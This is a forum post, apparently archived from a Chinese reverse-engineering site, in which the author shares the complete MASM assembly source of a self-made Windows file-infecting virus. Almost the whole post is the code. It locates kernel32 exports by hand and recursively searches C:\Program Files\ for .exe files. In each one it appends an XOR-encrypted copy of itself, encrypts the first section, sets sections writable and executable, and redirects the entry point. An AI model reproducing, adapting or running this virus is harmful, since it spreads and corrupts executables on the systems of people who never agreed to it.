
# 刚写的一个病毒（好像是第一次发帖，别砸砖）

> 原文：[www.pediy.com/kssd/pediy10/95712.html](https://www.pediy.com/kssd/pediy10/95712.html)

平常都在 `debugman` 混了，这玩意也不能发那里，就来这里露怯把！！！

```asm
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Module:peinj.asm
;
;Author:charme[N.B.C]
;Email:charme000@gmail.com
;Time:2009.8.13
;Index：www.hi.baidu.com/charme000
;Description:
;
;-感染 c:\progma file\下的 exe 文件
;-加密开始的一个节
;-key 也简单
;
;Copyright (c) 2009 charme.
;
;Just for fun!
;Do it ,do our best!
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

.486
.model flat,stdcall
option casemap :none
include windows.inc
include kernel32.inc
includelib kernel32.lib

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

VIRUS_SIZE     equ end_virus - start_virus     ;病毒大小
VIRUS_BODYSIZE equ end_virus - virus_body      ;病毒体大小
VIRUS_DECRSIZE equ virus_body - start_virus    ;病毒头大小

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;三个过程
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

@InfectFile PROTO
@FirstRecurse PROTO
@FindEexRecurse PROTO

.data

dummy dd 0

;;==============================================================;;                 == = =       ==      =
;;=------------------------------------------------------------=;;                ==            =  =   =  =
;;=                                                     =;;             =                =   =  =   =
;;=                     **的开始                     =;;      =           =      =  =   =
;;=                                                     =;;             =           =      = =    =
;;=------------------------------------------------------------=;;                ==        =      =      =
;;==============================================================;;           = = == =          =  ==   ==   ==  ==www.hi.baidu.com/charme000==

.code

start_virus:
call GetDelta             ;变量,执行完 push esp

GetDelta:
pop ebp
sub ebp,offset GetDelta  ;典型的重定位

;*
@@:
lea esi, [ebp + offset virus_body]
lea edi, [ebp + offset virus_body]
mov ecx, VIRUS_BODYSIZE  ;一看就是准备循环
mov bl,[ebp + xor_key]   ;加密

@@:
.if ecx == 0
    jmp @F
.endif

lodsb           ;从 esi 指向的内存中读取一个字节到 al 中，同时 inc esi
xor al,bl       ;逐字节加密
stosb           ;把 al 中的内存存入 edi
dec ecx         ;递减计数
jmp @B

@@:
    jmp @F      ;跳转到*处

virus_body:     ;开始病毒执行体
db "charme"

@@:
mov esi, [ebp + firstSegtVOffs]
mov edi,esi
mov ecx, [ebp + firstSegtVSize];作为计数

@@:
.if ecx == 0
    jmp @F
.endif

lodsb
xor al,bl
stosb
dec ecx
jmp @B

@@:
mov [ebp + xor_key],bl;保存密匙
mov eax,[esp]
and eax,0FFFFF000h;找到基址

compare:
cmp WORD ptr [eax],'ZM'
je api_found
sub eax, 1000h;一页一页搜索
jmp compare;循环

api_found:

;LoadLibrary
mov    [ebp + KernelBase], eax;保存指针
lea    esi, [ebp + _LoadLibrary]
call   GetFunctionAddress
mov [ebp + _a_LoadLibrary],eax;保存函数地址

;FindFirstFile
mov eax, [ebp + KernelBase]
lea esi, [ebp + _FindFirstFile]
call GetFunctionAddress
mov [ebp + _a_FindFirstFile],eax

;SetCurrentDirectory
mov eax, [ebp + KernelBase]
lea esi, [ebp + _SetCurrentDirectory]
call GetFunctionAddress
mov [ebp + _a_SetCurrentDirectory],eax

;GetFileAttributes
mov eax, [ebp + KernelBase]
lea esi, [ebp + _GetFileAttributes]
call GetFunctionAddress
mov [ebp + _a_GetFileAttributes],eax

;FindNextFile
mov eax, [ebp + KernelBase]
lea esi, [ebp + _FindNextFile]
call GetFunctionAddress
mov [ebp + _a_FindNextFile],eax

;FindClose
mov eax, [ebp + KernelBase]
lea esi, [ebp + _FindClose]
call GetFunctionAddress
mov [ebp + _a_FindClose],eax

;CreateFile
mov eax, [ebp + KernelBase]
lea esi, [ebp + _CreateFile]
call GetFunctionAddress
mov DWORD ptr [ebp + _a_CreateFile],eax

;lstrcpy
mov eax, [ebp + KernelBase]
lea esi, [ebp + _lstrcpy]
call GetFunctionAddress
mov DWORD ptr [ebp + _a_lstrcpy],eax

;GetFileSize
mov eax, [ebp + KernelBase]
lea esi, [ebp + _GetFileSize]
call GetFunctionAddress
mov DWORD ptr [ebp + _a_GetFileSize],eax

;CreateFileMapping
mov eax, [ebp + KernelBase]
lea esi, [ebp + _CreateFileMapping]
call GetFunctionAddress
mov [ebp + _a_CreateFileMapping],eax

;MapViewOfFile
mov eax, [ebp + KernelBase]
lea esi, [ebp + _MapViewOfFile]
call GetFunctionAddress
mov [ebp + _a_MapViewOfFile],eax

;ExitProcess
mov eax, [ebp + KernelBase]
lea esi, [ebp + _ExitProcess]
call GetFunctionAddress
mov [ebp + _a_ExitProcess],eax

;UnmapViewOfFile
mov eax, [ebp + KernelBase]
lea esi, [ebp + _UnmapViewOfFile]
call GetFunctionAddress
mov [ebp + _a_UnmapViewOfFile],eax

;CloseHandle
mov eax, [ebp + KernelBase]
lea esi, [ebp + _CloseHandle]
call GetFunctionAddress
mov [ebp + _a_CloseHandle],eax

jmp found_all  ;来个大跳转

;;-----------------------;;
;;    从导入表找函数     ;;
;;-----------------------;;

GetFunctionAddress:
    mov    ebx, [eax + 3Ch]                     ;pe header
    add    ebx, eax;加上基址
    add    ebx, 120
    mov    ebx, [ebx]
    add    ebx, eax                ;Export Address
    xor    edx, edx
    mov    ecx, [ebx + 32]        ;functionname
    add    ecx, eax
    push    esi
    push    edx

CompareNext:
    pop    edx
    pop    esi
    inc    edx
    mov    edi, [ecx]
    add    edi, eax
    add    ecx, 4
    push    esi
    push    edx

CompareName:
    mov    dl, [edi]
    mov    dh, [esi]
    cmp    dl, dh
    jne    CompareNext
    inc    edi
    inc    esi
    cmp    BYTE ptr [esi], 0
    je    GetAddress
    jmp    CompareName

GetAddress:
    pop    edx
    pop    esi
    dec    edx
    shl    edx, 1
    mov    ecx, [ebx + 36]
    add    ecx, eax
    add    ecx, edx
    xor    edx, edx
    mov    dx, [ecx]
    shl    edx, 2
    mov    ecx, [ebx + 28]
    add    ecx, eax
    add    ecx, edx
    add    eax, [ecx]
    ret

found_all:
lea esi,[ebp + _STRING_RootInfect]
push esi
mov eax,[ebp + _a_SetCurrentDirectory];changes the current directory for the current process
call eax
push ebp
call @FirstRecurse;这个是自己定义的函数
pop ebp
jmp end_virus

;;-----------------------;;
;;         找 exe         ;;
;;-----------------------;;

@FindEexRecurse PROC
;HANDLE FindFirstFile(
;  LPCTSTR lpFileName,
;  LPWIN32_FIND_DATA lpFindFileData
;);
lea eax,[ebp + OFFSET __STRUCT_Win32_FindExes]
push eax
lea eax,[ebp + OFFSET __STRING_Dot_Exe]
push eax
mov eax,[ebp + _a_FindFirstFile]
call eax
mov [ebp + __HND_ExeFind],eax;保存返回的文件句柄

.if eax == INVALID_HANDLE_VALUE
    mov eax,-1
    jmp finish
.endif

lea esi,[ebp + OFFSET __STRUCT_Win32_FindExes]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName;查询这个成员
mov esi,eax

lodsb  ;从 esi 中取出一个字节放入 al
.if al == '.'
    jmp @F
.endif

lea esi,[ebp + __STRUCT_Win32_FindExes]
assume esi:ptr WIN32_FIND_DATA
lea eax,[esi].cFileName
push eax
push eax;这里其实 push 一个就可以了
mov eax,[ebp + _a_GetFileAttributes]
call eax  ;返回一个文件或者目录的属性
.if eax != FILE_ATTRIBUTE_DIRECTORY  ;如果是目录
pop eax
mov [ebp + __PTR_fileName],eax
call @InfectFile  ;感染之
.else
pop eax
.endif
```



```asm
@@:  

lea esi, [ebp + OFFSET __STRUCT_Win32_FindExes]  
push esi  
mov esi, [ebp + __HND_ExeFind]  
push esi  
mov eax, [ebp + _a_FindNextFile]  
call eax ;继续找文件  

.if eax == 0  
jmp @F  
.endif  

lea esi, [ebp + OFFSET __STRUCT_Win32_FindExes]  
assume esi:ptr WIN32_FIND_DATA  
lea eax, [esi].cFileName  
mov esi, eax  
lodsb  

.if al == '.'  
jmp @B ;继续找文件  
.endif  

lea esi, [ebp + __STRUCT_Win32_FindExes]  
assume esi:ptr WIN32_FIND_DATA  
lea eax, [esi].cFileName  
push eax  
push eax  
mov eax, [ebp + _a_GetFileAttributes]  
call eax  

.if eax != FILE_ATTRIBUTE_DIRECTORY  
pop eax  
mov [ebp + __PTR_fileName], eax  
call @InfectFile  
.else  
pop eax  
.endif  

jmp @B ;一直循环  

@@:  
finish:  
ret  
@FindEexRecurse ENDP  

;;-----------------------;;  
;;         一级资源       ;;  
;;-----------------------;;  

@FirstRecurse PROC  
lea esi, [ebp + OFFSET __STRUCT_Win32_FindData]  
push esi  
lea esi, [ebp + OFFSET __STRING_Dot_Star]  
push esi  
mov eax, [ebp + _a_FindFirstFile]  
call eax  
mov [ebp + __HND_FirstFind], eax  

.if eax == INVALID_HANDLE_VALUE  
mov eax, -1  
jmp finish1  
.endif  

lea esi, [ebp + OFFSET __STRUCT_Win32_FindData]  
assume esi:ptr WIN32_FIND_DATA  
lea eax, [esi].cFileName  
mov esi, eax  
lodsb  

.if al == '.'  
jmp @F  
.endif  

lea esi, [ebp + OFFSET __STRUCT_Win32_FindData]  
assume esi:ptr WIN32_FIND_DATA  
lea eax, [esi].cFileName  
push eax  
mov eax, [ebp + _a_GetFileAttributes]  
call eax  

.if eax == FILE_ATTRIBUTE_DIRECTORY  
lea esi, [ebp + OFFSET __STRUCT_Win32_FindData]  
assume esi:ptr WIN32_FIND_DATA  
lea eax, [esi].cFileName  
push eax  
mov eax, [ebp + _a_SetCurrentDirectory]  
call eax  

call @FindEexRecurse  

lea eax, [ebp + __STRING_Dot_Dot]  
push eax  
mov eax, [ebp + _a_SetCurrentDirectory]  
call eax  
.endif  

@@:  
lea esi, [ebp + OFFSET __STRUCT_Win32_FindData]  
push esi  
mov eax, [ebp + __HND_FirstFind]  
push eax  
mov eax, [ebp + _a_FindNextFile]  
call eax  

.if eax == 0  
jmp @F  
.endif  

lea esi, [ebp + OFFSET __STRUCT_Win32_FindData]  
assume esi:ptr WIN32_FIND_DATA  
lea eax, [esi].cFileName  
mov esi, eax  
lodsb  

.if al == '.'  
jmp @B  
.endif  

lea esi, [ebp + OFFSET __STRUCT_Win32_FindData]  
assume esi:ptr WIN32_FIND_DATA  
lea eax, [esi].cFileName  
push eax  
mov eax, [ebp + _a_GetFileAttributes]  
call eax  

.if eax == FILE_ATTRIBUTE_DIRECTORY  
lea esi, [ebp + OFFSET __STRUCT_Win32_FindData]  
assume esi:ptr WIN32_FIND_DATA  
lea eax, [esi].cFileName  
push eax  
mov eax, [ebp + _a_SetCurrentDirectory]  
call eax  

call @FindEexRecurse  

lea eax, [ebp + __STRING_Dot_Dot]  
push eax  
mov eax, [ebp + _a_SetCurrentDirectory]  
call eax  
.endif  

jmp @B  

@@:  
finish1:  
ret  
@FirstRecurse ENDP  

;;-----------------------;;  
;;        感染           ;;  
;;-----------------------;;  

@InfectFile PROC  
push NULL  
push FILE_ATTRIBUTE_NORMAL  
push OPEN_ALWAYS  
push NULL  
push FILE_SHARE_READ or FILE_SHARE_WRITE  
push GENERIC_WRITE or GENERIC_READ  

mov eax, [ebp + __PTR_fileName] ;文件指针  
push eax  
mov eax, [ebp + _a_CreateFile] ;创建文件  
call eax  
mov [ebp + __HND_File], eax ;文件句柄  

push NULL  
push eax  
mov eax, [ebp + _a_GetFileSize]  
call eax ;获得文件大小  

add eax, VIRUS_SIZE  
add eax, 1000h  
mov [ebp + __max_size], eax ;最后文件的大小  

push 0  
mov eax, [ebp + __max_size]  
push eax  
push 0  
push PAGE_READWRITE  
push NULL  
mov eax, [ebp + __HND_File]  
push eax  
mov eax, [ebp + _a_CreateFileMapping]  
call eax ;创建映射文件  
mov [ebp + __MAP_File], eax ;hMap  

push DWORD ptr [ebp + offset __max_size]  
push 0  
push 0  
push FILE_MAP_WRITE  
mov eax, [ebp  + __MAP_File]  
push eax  
mov eax, [ebp + _a_MapViewOfFile]  
call eax ;开始映射  
mov [ebp + __PTR_File], eax  
mov edi, eax  
xor eax, eax  
assume edi:ptr IMAGE_DOS_HEADER  
mov ax, [edi].e_magic  
add edi, [edi].e_lfanew  
assume edi:ptr IMAGE_NT_HEADERS  
add edi, SIZEOF DWORD  
assume edi:ptr IMAGE_FILE_HEADER  
xor ecx, ecx  
mov cx, [edi].NumberOfSections  
mov [ebp + totalSec], ecx ;节个数  
add edi, SIZEOF IMAGE_FILE_HEADER  
mov [ebp + ptrEP], edi ;到达节表处  
assume edi:ptr IMAGE_OPTIONAL_HEADER32  
mov eax, [edi].ImageBase  
mov [ebp + firstSegtVOffs], eax ;镜像基址  
add eax, [edi].AddressOfEntryPoint  
mov [ebp + oldEP], eax ;保存旧的入口点  
mov eax, [edi].FileAlignment  
mov [ebp + fileAlign], eax  
add edi, SIZEOF IMAGE_OPTIONAL_HEADER32  
assume edi:ptr IMAGE_SECTION_HEADER  

;    - EDI 指向当前节表头  
;    - ESI 指向 RawData 高位  
;    - EAX holds ESI's "parent" segment header pointer  
xor esi, esi  

@@:  
.if ecx == 0  
jmp @F  
.endif  

; 加密第一个节表  
.if esi == 0  
mov eax, [edi].PointerToRawData  
mov [ebp + firstSegtOffset], eax  
mov eax, [edi].VirtualAddress  
add [ebp + firstSegtVOffs], eax ;rva  
mov eax, [edi].Misc.VirtualSize  
mov [ebp + firstSegtVSize], eax  
mov al, BYTE ptr [edi].Name1  
mov [ebp + firstSegtKey], al  
mov eax, [edi].Characteristics  
or eax, 0A0000020h  
mov [edi].Characteristics, eax  
.endif  

.if [edi].PointerToRawData > esi  
mov esi, [edi].PointerToRawData  
mov eax, edi  
.endif  

add edi, SIZEOF IMAGE_SECTION_HEADER  
dec ecx  
jmp @B ;循环  

@@:  
mov edi, eax  
assume edi:ptr IMAGE_SECTION_HEADER  
mov ebx, [edi].Misc.VirtualSize  
add ebx, VIRUS_SIZE  
add ebx, 7  
mov [edi].Misc.VirtualSize, ebx  
push edi  

lea eax, [edi].Name1  
mov edi, eax  
mov al, '.' ;text section  
stosb  
mov al, 't'  
stosb  
mov al, 'e'  
stosb  
mov al, 'x'  
stosb  
mov al, 't'  
stosb  
mov al, 0  
stosb  
pop edi  
xor edx, edx  
mov eax, ebx  
mov ebx, [ebp + fileAlign]  
div ebx ;对齐下  

.if edx == 0  
mov eax, [edi].Misc.VirtualSize  
jmp dont_round  
.endif  

mov eax, [edi].Misc.VirtualSize  
mov ebx, [ebp + fileAlign]  
push ebx  
xor ecx, ecx  
mov edx, eax  

@@:  
inc ecx  
shr ebx, 1  

.if ebx == 0  
dec ecx  
jmp @F  
.endif  
jmp @B  

@@:  
sar eax, cl  
sal eax, cl  
pop ebx  
add eax, ebx  

dont_round:  
mov ebx, [edi].SizeOfRawData  
mov [edi].SizeOfRawData, eax  
sub eax, ebx  
shr eax, 12  
shl eax, 12  
mov [ebp + deltaImage], eax  
mov eax, [edi].Characteristics  
or eax, 0A0000020h  
mov [edi].Characteristics, eax  
mov esi, [edi].VirtualAddress  
add esi, [edi].Misc.VirtualSize  
sub esi, VIRUS_SIZE  
sub esi, 7  
push esi ;新入口点  
mov esi, [edi].PointerToRawData  
add esi, [edi].Misc.VirtualSize  
sub esi, VIRUS_SIZE  
sub esi, 7  
mov edi, esi  
add edi, [ebp + __PTR_File]  

lea esi, [ebp + offset start_virus] ;解密  
mov ecx, VIRUS_DECRSIZE  
rep movsb ;esi 中的拷贝到 edi  

lea esi, [ebp + offset virus_body]  
mov ecx, VIRUS_BODYSIZE  
mov bl, [ebp + xor_key]  

;变换 key  
inc bl  

; xor 0, bl = bl  
xor al, al  
mov [ebp + xor_key], al  

@@:  
.if ecx == 0  
jmp @F  
.endif  
lodsb  
xor al, bl  
stosb  
dec ecx  
jmp @B  

@@:  
push edi  

; 加密主体  
mov esi, [ebp + firstSegtOffset]  
add esi, [ebp + __PTR_File]  
mov edi, esi  
mov ecx, [ebp + firstSegtVSize]  

@@:  
.if ecx == 0  
jmp @F  
.endif  
lodsb  
xor al, bl  
stosb  
dec ecx  
jmp @B  

@@:  
pop edi  
mov al, 0b8h ;感染标记  
stosb  
mov eax, [ebp + oldEP]  
stosd  
mov ax, 0d0ffh ;还原标记  
stosw  
mov edi, [ebp + ptrEP]  
assume edi:ptr IMAGE_OPTIONAL_HEADER32  

pop eax  
mov [edi].AddressOfEntryPoint, eax  
pop eax  
mov ebx, [edi].SizeOfImage  
mov eax, [ebp + deltaImage]  
add ebx, eax  
mov [edi].SizeOfImage, ebx  

; 清理战场  
mov eax, [ebp + __PTR_File]  
push eax
```



```
mov eax, [ebp + _a_UnmapViewOfFile]

call eax

mov eax, [ebp + __MAP_File]

push eax

mov eax, [ebp + _a_CloseHandle]

call eax

mov eax, [ebp + __HND_File]

push eax

mov eax, [ebp + _a_CloseHandle]

call eax

ret

@InfectFile ENDP

jmp end_virus

;;-----------------------------------无穷寂寞--------------------------------------;;

xor_key           db 0

firstSegtOffset    dd 0

firstSegtVSize     dd 0

firstSegtVOffs     dd 0

firstSegtKey       db 0

_LoadLibrary db "LoadLibrary",0

_a_LoadLibrary dd 0

_CreateFile db "CreateFile",0

_a_CreateFile dd 0

_CreateFileMapping db "CreateFileMapping",0

_a_CreateFileMapping dd 0

_MapViewOfFile db "MapViewOfFile",0

_a_MapViewOfFile dd 0

_SetCurrentDirectory db "SetCurrentDirectory",0

_a_SetCurrentDirectory dd 0

_ExitProcess db "ExitProcess",0

_a_ExitProcess dd 0

_MessageBox db "MessageBox",0

_a_MessageBox dd 0

_UnmapViewOfFile db "UnmapViewOfFile",0

_a_UnmapViewOfFile dd 0

_CloseHandle db "CloseHandle",0

_a_CloseHandle dd 0

_GetFileSize db "GetFileSize",0

_a_GetFileSize dd 0

_FindFirstFile db "FindFirstFile",0

_a_FindFirstFile dd 0

_GetFileAttributes db "GetFileAttributes",0

_a_GetFileAttributes dd 0

_FindNextFile db "FindNextFile",0

_a_FindNextFile dd 0

_FindClose db "FindClose",0

_a_FindClose dd 0

_lstrcpy db "lstrcpy",0

_a_lstrcpy dd 0

__DLL_User32 db "user32",0

__STRING_FileName db "petest.exe",0

__STRING_newdir db MAX_PATH dup(0)

__STRING_dotdot db "..",0

__STRING_filemask db "*.*",0

__STRING_Dot_Star db "*.*",0

__STRING_Dot_Exe db "*.exe",0

__STRING_Dot_Dot db "..",0

__HND_File dd 0

__HND_FirstFind dd 0

__HND_ExeFind dd 0

__MAP_File dd 0

__PTR_File dd 0

;_User32 dd 0

KernelBase dd 0

totalSec dd 0

ptrEP dd 0

oldEP dd 0

oldLast dd 0

secNum dd 0

fileAlign dd 0

deltaImage dd 0

oldrawsize dd 0

__STRUCT_Win32_FindData WIN32_FIND_DATA <>

__STRUCT_Win32_FindExes WIN32_FIND_DATA <>

_STRING_RootInfect db "C:\Program Files\",0

__PTR_fileName dd 0

__max_size     dd 0

;;-----------------------------------无穷寂寞--------------------------------------;;

end_virus:

ret

end start_virus
```
